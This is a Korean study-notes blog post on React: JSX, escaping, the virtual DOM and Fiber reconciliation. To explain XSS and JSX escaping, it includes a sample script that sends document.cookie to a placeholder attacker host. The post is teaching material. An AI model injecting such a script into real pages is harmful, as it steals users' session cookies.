---
title: '모던 리액트 2-1'
excerpt: '모던 리액트 공부 기록'
date: '2024-01-01'
author: '김효중'
category: 'React'
image: '/images/postImg/reflection.jpg'
---

옛날에 웹 개발자의 관심사는 오직 순수한 HTML이였습니다.

```jsx
HTML,CSS,JS는 무조건 별도로 분리하자!
```

HTML,JS,CSS가 분리되어 깔끔하고 순수해 보입니다. 그러나 몇가지 문제가 존재했습니다.

- HTML 태그를 변경하려면 자바스크립트 폴더의 위치까지 가야하네? 그리고 나서 HTML Selector를 확인해야 하네??
- 자바스크립트 파일을 수정하려면 HTML 파일을 열어서 구조를 확인하고 HTMLSelector를 확인해야 하네??

그리고 분리 이후 유지보수에도 문제가 생깁니다.

JS파일,HTML파일을 왔다갔다 하면서 코드를 수정해야 하는 귀찮음이 생겼습니다.

### 굳이 분리해야 하나?

그러던 중 Angular라는 프레임워크가 나왔습니다. 데이터가 수정되면 HTML이 자동으로 변경되고, 마크업이 변경되었습니다.

```jsx
<div ng-controller="MyController">
  <div ng-repeat="item in list">
    {{ item }}
  </div>
</div>
<script>
  controllers.controller('MyController',($scope)=>{
  	$scope.list = [1,2,3,4,5];
  });
</script>
```

 

이렇게 한 파일안에 HTML,Controller가 한 묶음으로 여겨져서 불편함이 해소될 수 있었습니다.

이렇게 Augular를 시작으로 사람들은 자바스크립트,HTML의 묶음을 받아들이기 시작합니다.

Angular가 HTML안에 자바스크립트를 넣는다면,

React는 자바스크립트 안에 HTML을 넣습니다.

### JSX

![Untitled](data:image/png;base64,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)

JSX는 자바스크립트 표준 코드가 아닌 페이스북이 임의로 만든 새로운 문법입니다. 

따라서 반드시 **트랜스파일러**를 거쳐야 비로소 자바스크립트 코드로 변환됩니다. 보통 바벨로 자바스크립트로 변환되어집니다.

JSX는 HTML,XML 외에도 다른 구문으로 확장될 수 있게 설계되어 있습니다.

JSX는 JSXElement, JSXAttributes,JSXChildren,JSXStrings 4가지로 구성되어 있다.

### 요소명은 대문자로 시작해야만 되는 거 아닌가요?

리액트에서는 컴포넌트를 만들어 사용할 때 반드시 대문자로 시작해야 한다.

이는 JSXElements 표준에는 없는 내용인데, 왜냐하면 리액트에서 HTML 태그명과 사용자가 만든 컴포넌트 태그명을 구분 짓기 위해서다.

- textarea, a, span 같은 현존하는 HTML 태그만 필터링하지 않고 이런 규칙을 둔 이유는 미래에 추가될 HTML 태그에 대한 가능성을 열어두며, 사람이 확실히 구별할 수 있게 하기 위함으로 보인다.

### 이스케이프

특정 문자를 원래의 기능에서 벗어나게 변환하는 것을 이스케이프라고 한다

```jsx
&은 &amp;로
<은 &lt;로
>은 &gt;로
"은 &quot;로
'은 &#39로
띄어쓰기는 &nbsp;로
```

예를 들어, HTML에서 아래는 렌더링 되지 않는다.

```jsx
<div><onlyDev</div>
```

HTML은 <을 태그의 시작으로 인지해 뒷부분에 에러가 발생한다.

이런 상황을 고려해 원래 기능에서 벗어난 문자열로 변환해 의도대로 구문을 파악하도록 이스케이프 한다.

```jsx
<div>&lt;onlyDev</div>
```

이스케이프는 XSS공격을 방지할 수 있다.

### XSS

보통 블로그나 게시판과 같은 서비스에서 발생하며, 글에 스크립트를 주입해 사용자의 정보를 터는 작업을 한다.

예를들어서

- 제목과 글을 입력해 글을 쓴다.
- 웹 서버에서 데이터를 받아 DB에 넣어둔다.
- 다른 사용자가 해당 서버의 DB에 저장된 글을 읽으면
- 그 때 내용을 볼 수 있다.

[](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/0QvWA/btq9EiqfEpu/gS1LZwFK0Ik0jTzVwOhhK1/img.png)

이 과정에서 글 대신 스크립트 언어를 써서 다른 사용자가 글을 읽을 때 

스크립트 언어가 실행되어 피해를 입게 되는 것이 XSS 공격이다!

```jsx
<script>
  let xmlHttp = new XMLHttpRequest();
  const url =
    'http://hackerServer.com?victimCookie=' +
    document.cookie;
  xmlHttp.open('GET', url);
  xmlHttp.send();
</script>
```

### JSX에 삽입된 모든 값을 렌더링하기 전에 이스케이프한다.

그럼 위의 코드를 이스케이프하면 어떤 모양일까?

```jsx
<!-- 이스케이프 후  -->
&lt;script&gt;
  let xmlHttp = new XMLHttpRequest();
  const url =
    &quot;http://hackerServer.com?victimCookie=&quot; +
    document.cookie;
  xmlHttp.open(&quot;GET&quot;, url);
  xmlHttp.send();
&lt;/script&gt;
```

이렇게 되면 HTML 본연의 태그나 스크립트 기능이 제거되기 때문에 XSS 공격을 방지할 수 있다.

### JSX의 예제

```jsx
const A = <A>안녕하세요</A>
const B = <A />
const C = <A {...{required:true}} />
const D = <A required />
const E = <A required={false} />

const F = (
  <A>
    <B text="리액트" />
  </A>
)

const G = (
  <A>
    <B optionalChildren={<>'안녕'</>} />
  </A>
)

const H = (
  <A>
    안녕하세요
    <B optionalChildren={<>'안녕'</>} />
  </A>
)
```

### JSX는 어떻게 자바스크립트로 변환될까 ?

먼저 리액트에서 JSX를 변환하는 @babel/plugin-transform-react-jsx 플러그인이 필요하다.

이 플러그인은 JSX를 자바스크립트가 이해하는 형태로 변환한다.

변환 전 코드

```jsx
/** @jsxRuntime classic */

const profile = (
  <div>
    <img src="avatar.png" className="profile" />
    <h3>{[user.firstName, user.lastName].join(" ")}</h3>
  </div>
);
```

변환 후 코드

```jsx
const profile = React.createElement(
  "div",
  null,
  React.createElement("img", { src: "avatar.png", className: "profile" }),
  React.createElement("h3", null, [user.firstName, user.lastName].join(" "))
);
```

## 가상 DOM과 리액트 파이버

요 자료들 추천추천

https://d2.naver.com/helloworld/2690975

https://blog.mathpresso.com/react-deep-dive-fiber-88860f6edbd0

https://bumkeyy.gitbook.io/bumkeyy-code/frontend/a-deep-dive-into-react-fiber-internals

### DOM과 브라우저 렌더링 과정

DOM은 웹 페이지에 대한 인터페이스로 브라우저가 웹페이지의 콘텐츠와 구조를 어떻게 보여줄지에 대한 정보를 담는다. 

1. **HTML를 [파싱](https://github.com/Esoolgnah/Frontend-Interview-Questions/blob/main/Notes/important-5/browser-rendering.md#gear-%ED%8C%8C%EC%8B%B1) 후, [DOM](https://github.com/Esoolgnah/Frontend-Interview-Questions/blob/main/Notes/important-5/browser-rendering.md#gear-dom)트리를 구축합니다.**
2. **CSS를 파싱 후, [CSSOM](https://github.com/Esoolgnah/Frontend-Interview-Questions/blob/main/Notes/important-5/browser-rendering.md#gear-cssom)트리를 구축합니다.**
3. **Javascript를 실행합니다.**
    - 주의! HTML 중간에 스크립트가 있다면 HTML 파싱이 중단됩니다.
4. **DOM과 CSSOM을 조합하여 [렌더트리](https://github.com/Esoolgnah/Frontend-Interview-Questions/blob/main/Notes/important-5/browser-rendering.md#gear-%EB%A0%8C%EB%8D%94%ED%8A%B8%EB%A6%AC)를 구축합니다.**
    - 주의! display: none 속성과 같이 화면에서 보이지도 않고 공간을 차지하지 않는 것은 렌더트리로 구축되지 않습니다.
5. **뷰포트 기반으로 렌더트리의 각 노드가 가지는 정확한 위치와 크기를 계산합니다. ([Layout](https://github.com/Esoolgnah/Frontend-Interview-Questions/blob/main/Notes/important-5/browser-rendering.md#gear-layout) 단계)**
6. **계산한 위치/크기를 기반으로 화면에 그립니다. ([Paint](https://github.com/Esoolgnah/Frontend-Interview-Questions/blob/main/Notes/important-5/browser-rendering.md#gear-paint) 단계)**

![](
data:image/png;base64,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)

### 가상 DOM의 등장 배경

브라우저가 웹페이지를 렌더링하는 과정은 매우 복잡하고 많은 비용이 든다.

또한 렌더링 이후 정보를 보여주는데 그치지 않고 사용자의 인터렉션을 통해 다양한 정보를 노출한다. 이 때 사용자의 인터렉션으로 인해 웹 페이지가 변경되는 상황 또한 고려해야 한다.

하나의 인터렉션으로 DOM의 여러 가지가 바뀌는 사나리오는 요즘 현재 웹에서 되게 흔한 상황이다. 그리고 이런 DOM의 변경점을 추적하기에는 개발자 입장에서 너무 수고가 많이 들게 된다.

개발하는 사람 입장에서 인터렉션에서 발생하는 DOM의 변경보다는 그래서 최종적으로 어떻게 DOM이 바뀌었는데? 가 더 궁금할 수 있다. 이렇게 인터렉션에 따른 DOM의 최종 결과물을 간편하게 제공하기 위해 가상 DOM이 등장한다.


### 변화를 감지하는 방법

- Dirty checking

이 방법은 node tree를 재귀적으로 순회하면서 어떤 노드에 변화가 생겼는지 인식하는 방법이다. 

그리고 변화된 노드를 리랜더링 시키는 방법이다. 그러나 이렇게 하면 변화가 없을 때에도 재귀적으로 노드를 탐색해야 하므로, 불필요한 비용이 들 수 있다.

- observable

이 방법은 변화가 생긴 노드가 관찰자에게 알림을 보내주는 방식이다.

리액트의 경우 state의 변화가 생겼을 때, 리액트에게 <b>다시 렌더링을 해줘</b>라고 알림을 보내준다.

그리고 리액트는 알림을 받으면 다시 렌더링을 시킨다. <b>노드에 변화가 생겼다는 알림을 받으면 렌더링</b>하는 것이다.

그러나 observable의 방법도 문제가 있다. 변화에 대한 알림을 받으면 <b>전체를 렌더링시킨다.</b> 이 방법은 엄청나게 많은 reflow-repaint 과정을 일으칼 수 있다.

### 가상 DOM

가상 DOM은 메모리에 존재하는 하나의 <b>객체</b>이다. 리액트는 이제 state의 변화가 생기면 -> 실제의 DOM을 렌더링시키는 게 아니라 가상 DOM을 렌더링시킨다.

```ts
브라우저를 새로 렌더링하는 비용 VS 객체를 새로 만드는 비용
```

당연하게도, 새 객체를 만드는 것이 더 효율적으로 먹히게 된다.

최종적으로 리액트에서 변화가 생기면 가상 DOM이라는 메모리 상에 객체를 하나 만들고, 거기서 변화가 생긴 내용과 실제 DOM을 비교해 필요한 부분만 브라우저에 적용시킨다.

### 가상 DOM, 어떻게 동작하는데?

- 브라우저의 DOM(real DOM)으로부터 가상 DOM을 만든다.(가상 DOM은 메모리 상에 존재하는 하나의 객체이다.)
- 변화가 생기면 새로운 버전의 가상 DOM을 만든다.
- 최신 버전의 가상 DOM과 오래된 버전의 가상 DOM을 비교한다.(Diff 알고리즘)
- 비교 과정을 통해 발견한 차이점을 브라우저 DOM(real DOM)에 반영한다.

![](https://velog.velcdn.com/images/yesbb/post/43332f9c-1630-40b7-a1f7-a0325df77f8e/image.png)

이 과정을 재조정이라고 부른다.

### 가상 DOM을 위한 방법, 파이버 알고리즘

그럼 이 새로운 객체인 가상 DOM을 만드는 것을 리액트는 어떻게 진행할까 ?? 이것을 가능하게 해주는 것이 리액트 파이버(React Fiber)이다.

리액트 파이버는 평범한 자바스크립트 객체이다. 파이버는 파이버 재조정자(fiber reconciler)가 관리하는데, 가상 DOM과 실제 DOM을 비교해 변경사항을 수집하고, 이 둘의 차이가 생기면 파이버를 기준으로 화면에 렌더링을 요청하는 역할을 한다.


```ts
//파이버 객체

function FiberNode(tag, pendingProps, key, mode) {
    this.tag = tag;
    this.key = key;
    this.elementType = null;
    this.type = null;
    this.stateNode = null;

    this.return = null;
    this.child = null;
    this.sibling = null;
    this.index = 0;

    ...
}
```
이처럼 파이버는 단순한 자바스크립트 객체로 구성되어 있다. 그리고 이 파이버 객체는 최초로 컴포넌트가 마운트 되는 시점에 생기며, 최대한 재사용된다.

파이버는 state가 바뀌거나 생명주기 메서드가 실행되거나 , DOM 변경이 필요한 시점에 실행된다. 파이버는 앞서 작업들 (state가 바뀌는, 생명주기 메서드가 실핼되는)을 작은 단위로 나눌수도, 우선순위를 주어서 처리할 수도 있다.

파이버는 결국 <b>인스턴스에 대한 정보</b> , <b>다음 파이버로 향하는 포인터(alternate)</b>, 변경 사항에 대한 정보를 갖고 있다.

파이버는 크게 다음의 일을 수행할 수 있다.

- 작업을 작은 단위로 쪼개고, 우선순위를 준다.
- 작업을 일시 중지하고 나중에 다시 시작할 수 있다.
- 이전에 했던 작업을 다시 사용하거나 폐기할 수 있다.

이 모든 과정은 비동기로 일어난다. 그럼 진짜 파이버는 어떻게 구성되어 있을까? 일단 파이버는 <b>하나의 작업단위</b>로 구성되어 있다.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*aFtH62Hp2gol-AMnG_PDEg.png)

리액트는 이 하나의 작업단위를 처리하고 <b>finishedWork()</b>으로 마무리한다. 그리고 마지막으로 커밋을 하여 브라우저 DOM에 반영한다.

- 렌더단계에서 사용자에게 최종적으로 보이지 않는 모든 비동기 작업을 수행한다. 이 과정에서 파이버는 우선순위를 지정할 수도, 이전 작업을 다시 재사용하거나 , 폐지하는 일이 발생할 수 있다.

- 커밋단계에서 실제 DOM에 변경사항을 반영하는 작업 commitWork()가 실행되는데, 이 과정은 중단할 수 없다.

커밋단계까지 반영이 되면 <b>현재의 앱 상태</b>를 나타내는 <mark>flushed fiber</mark>와 아직 작업중인 상태, 화면까지 반영되지 않은 <mark>workInProgress fiber</mark> 2개의 fiber가 존재하게 된다.

![](https://miro.medium.com/v2/resize:fit:883/1*UQMEzFpmQKkINJh-KSux7w.png)

현재 UI 렌더링을 위해 존재하는 current(flushed fiber)을 기준으로 모든 작업이 시작된다. 만약 업데이트가 발생하면, 파이버는 리액트에서 최근의 데이터를 기준으로 workInProgress 트리를 빌드한다.

